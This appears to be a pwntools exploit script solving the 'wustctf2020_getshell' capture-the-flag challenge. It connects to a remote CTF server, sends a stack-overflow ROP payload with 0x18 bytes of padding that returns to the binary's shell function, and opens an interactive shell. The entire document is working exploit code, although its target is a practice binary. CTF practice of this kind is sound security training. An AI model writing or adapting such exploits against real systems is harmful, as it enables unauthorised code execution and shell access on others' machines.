from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../wustctf2020_getshell')

target = remote('node4.buuoj.cn', 28071)

system = elf.sym['shell']

payload = utils.create_rop_payload(0x18, {}, 'x86', system)
target.sendline(payload)
target.interactive()